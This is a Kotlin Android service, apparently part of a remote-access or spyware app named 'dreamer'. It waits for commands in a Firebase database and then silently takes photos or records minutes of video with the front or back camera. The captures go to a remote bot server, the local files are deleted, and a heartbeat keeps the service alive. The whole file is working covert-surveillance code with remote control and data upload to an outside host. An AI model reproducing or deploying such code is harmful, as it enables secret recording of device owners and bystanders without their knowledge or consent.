package com.h4k3r.dreamer

import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.widget.Toast
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.firebase.database.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import org.json.JSONObject

class CameraService : Service() {

    /* ── Authentication ─────────────────────────── */
    private lateinit var secretKey: String
    private lateinit var deviceId: String
    private lateinit var authHeader: String
    private var authRetryCount = 0
    private val maxAuthRetries = 10

    /* ── Coroutine Scope ────────────────────────── */
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    /* ── Camera Objects ─────────────────────────── */
    private lateinit var camMgr: CameraManager
    private lateinit var bgThread: HandlerThread
    private lateinit var bgHandler: Handler
    private var camDev: CameraDevice? = null
    private var capSes: CameraCaptureSession? = null
    private var imgReader: ImageReader? = null
    private var mediaRec: MediaRecorder? = null

    /* ── HTTP Settings ──────────────────────────── */
    private val http = OkHttpClient()
    private val server = "https://dreamer-bot.onrender.com"
    private val AUTH_KEY = "your_auth_key_if_any"  // Match with server

    /* ── Firebase Reference ─────────────────────── */
    private lateinit var deviceRef: DatabaseReference

    /* ── Lifecycle ──────────────────────────────── */
    override fun onCreate() {
        super.onCreate()

        // Load authentication from SharedPreferences
        val prefs = getSharedPreferences("dreamer_auth", MODE_PRIVATE)
        secretKey = prefs.getString("secret_key", "") ?: ""
        deviceId = prefs.getString("device_id", "") ?: ""

        if (secretKey.isEmpty() || deviceId.isEmpty()) {
            authRetryCount++
            if (authRetryCount > maxAuthRetries) {
                android.util.Log.e("CameraService", "Missing authentication, max retries reached. Stopping service.")
                stopSelf()
                return
            }
            android.util.Log.e("CameraService", "Missing authentication, will retry in 5 seconds (attempt $authRetryCount)")
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                onCreate()
            }, 5000)
            return
        } else {
            authRetryCount = 0 // reset on success
        }

        // Create auth header: "key:deviceId:authKey"
        authHeader = "$secretKey:$deviceId:$AUTH_KEY"

        if (!hasPerm(Manifest.permission.CAMERA)) {
            android.util.Log.w("CameraService", "Camera permission denied - stopping service")
            stopSelf()
            return
        }

        camMgr = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        bgThread = HandlerThread("cam-bg").apply { start() }
        bgHandler = Handler(bgThread.looper)

        // Set up Firebase reference for this specific device
        deviceRef = Firebase.database.reference
            .child("devices")
            .child(secretKey)
            .child(deviceId)

        listenFirebase()
        updateHeartbeat()
    }

    override fun onStartCommand(i: Intent?, f: Int, s: Int) = START_STICKY
    override fun onBind(i: Intent?): IBinder? = null

    override fun onDestroy() {
        scope.cancel()
        closeSession()
        if (::bgThread.isInitialized) bgThread.quitSafely()
        super.onDestroy()
    }

    /* ── Heartbeat for Online Status ────────────── */
    private fun updateHeartbeat() {
        scope.launch {
            while (isActive) {
                deviceRef.child("info").child("time").setValue(System.currentTimeMillis())
                delay(60_000) // Update every minute
            }
        }
    }

    /* ── Firebase Listener ──────────────────────── */
    private fun listenFirebase() {
        deviceRef.child("command").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(s: DataSnapshot) {
                val cmd = s.getValue(String::class.java) ?: return

                when {
                    cmd == "capture_front" -> takePhoto(true)
                    cmd == "capture_back" -> takePhoto(false)

                    cmd.startsWith("rec_front_") || cmd.startsWith("rec_back_") -> {
                        val parts = cmd.split('_')
                        val useFront = parts[1] == "front"
                        val mins = parts.last().toInt()
                        startRecording(useFront, mins)
                    }
                }
                s.ref.setValue(null) // ACK
            }

            override fun onCancelled(e: DatabaseError) {
                e.toException().printStackTrace()
            }
        })
    }

    /* ═════════════════ PHOTO CAPTURE ═════════════ */
    private fun takePhoto(useFront: Boolean) {
        if (!hasPerm(Manifest.permission.CAMERA)) return
        closeSession()

        val camId = selectCamera(useFront) ?: return
        imgReader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 2)

        try {
            camMgr.openCamera(camId, object : CameraDevice.StateCallback() {
            override fun onOpened(dev: CameraDevice) {
                camDev = dev
                dev.createCaptureSession(
                    listOf(imgReader!!.surface),
                    object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(sess: CameraCaptureSession) {
                            capSes = sess
                            val req = dev.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                addTarget(imgReader!!.surface)
                                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                            }.build()

                            imgReader!!.setOnImageAvailableListener({ rdr ->
                                rdr.acquireLatestImage()?.use { img ->
                                    val bytes = img.planes[0].buffer.run {
                                        ByteArray(remaining()).also(::get)
                                    }
                                    val file = File(cacheDir, "photo_${stamp()}.jpg").apply {
                                        writeBytes(bytes)
                                    }
                                    uploadFile("/capture", "photo", file)
                                }
                                closeSession()
                            }, bgHandler)

                            // Add delay for autofocus
                            bgHandler.postDelayed({
                                capSes?.capture(req, null, bgHandler)
                            }, 500)
                        }
                        override fun onConfigureFailed(s: CameraCaptureSession) = closeSession()
                    }, bgHandler
                )
            }
            override fun onDisconnected(dev: CameraDevice) = dev.close()
            override fun onError(dev: CameraDevice, e: Int) = dev.close()
        }, bgHandler)
        } catch (e: CameraAccessException) {
            Log.e(TAG, "Camera access denied: ${e.message}")
            if (e.reason == CameraAccessException.CAMERA_DISABLED) {
                // Send error to backend
                sendErrorToBackend("Camera disabled by device policy")
            }
            closeSession()
        } catch (e: Exception) {
            Log.e(TAG, "Camera error: ${e.message}")
            closeSession()
        }
    }

    /* ═════════════════ VIDEO RECORD ══════════════ */
    private fun startRecording(useFront: Boolean, minutes: Int) {
        if (!hasPerm(Manifest.permission.CAMERA)) return
        closeSession()

        val camId = selectCamera(useFront) ?: return
        val file = File(cacheDir, "video_${stamp()}.mp4")

        mediaRec = MediaRecorder().apply {
            setVideoSource(MediaRecorder.VideoSource.SURFACE)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            setVideoEncodingBitRate(4_000_000)
            setVideoFrameRate(30)
            setVideoSize(1280, 720)
            setOutputFile(file.absolutePath)
            prepare()
        }

        try {
            camMgr.openCamera(camId, object : CameraDevice.StateCallback() {
            override fun onOpened(dev: CameraDevice) {
                camDev = dev
                dev.createCaptureSession(listOf(mediaRec!!.surface),
                    object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(sess: CameraCaptureSession) {
                            capSes = sess
                            val req = dev.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                                addTarget(mediaRec!!.surface)
                                set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                            }.build()
                            sess.setRepeatingRequest(req, null, bgHandler)
                            mediaRec!!.start()

                            bgHandler.postDelayed({
                                stopRecording(file)
                            }, (minutes * 60_000L))
                        }
                        override fun onConfigureFailed(s: CameraCaptureSession) = closeSession()
                    }, bgHandler)
            }
            override fun onDisconnected(dev: CameraDevice) = dev.close()
            override fun onError(dev: CameraDevice, e: Int) = dev.close()
        }, bgHandler)
        } catch (e: CameraAccessException) {
            Log.e(TAG, "Camera access denied: ${e.message}")
            if (e.reason == CameraAccessException.CAMERA_DISABLED) {
                // Send error to backend
                sendErrorToBackend("Camera disabled by device policy")
            }
            closeSession()
        } catch (e: Exception) {
            Log.e(TAG, "Camera error: ${e.message}")
            closeSession()
        }
    }

    private fun stopRecording(f: File) {
        try {
            mediaRec?.apply { stop(); reset() }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        uploadFile("/video", "video", f)
        closeSession()
    }

    /* ═════════════ Utilities / Helpers ═══════════ */
    private fun uploadFile(endpoint: String, part: String, f: File) = scope.launch {
        try {
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart(part, f.name, f.asRequestBody(
                    if (part == "photo") "image/jpeg".toMediaType()
                    else "video/mp4".toMediaType()
                )).build()

            val request = Request.Builder()
                .url("$server$endpoint")
                .addHeader("X-Auth", authHeader)
                .post(body)
                .build()

            http.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    println("Upload failed: ${response.code}")
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        } finally {
            f.delete()
        }
    }

    private fun selectCamera(front: Boolean): String? =
        camMgr.cameraIdList.firstOrNull { id ->
            camMgr.getCameraCharacteristics(id)
                .get(CameraCharacteristics.LENS_FACING)
                .let {
                    if (front) it == CameraCharacteristics.LENS_FACING_FRONT
                    else it == CameraCharacteristics.LENS_FACING_BACK
                }
        }

    private fun closeSession() {
        capSes?.close(); capSes = null
        camDev?.close(); camDev = null
        imgReader?.close(); imgReader = null
        mediaRec?.release(); mediaRec = null
    }

    private fun hasPerm(p: String) =
        ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED

    private fun stamp() =
        SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())

    private fun sendErrorToBackend(error: String) = scope.launch {
        try {
            val json = JSONObject().apply {
                put("error", error)
                put("device", deviceId)
                put("timestamp", System.currentTimeMillis())
            }

            val body = RequestBody.create(
                "application/json".toMediaType(),
                json.toString()
            )

            val request = Request.Builder()
                .url("$server/error")
                .addHeader("X-Auth", authHeader)
                .post(body)
                .build()

            http.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    Log.e(TAG, "Error report failed: ${response.code}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send error to backend: ${e.message}")
        }
    }
}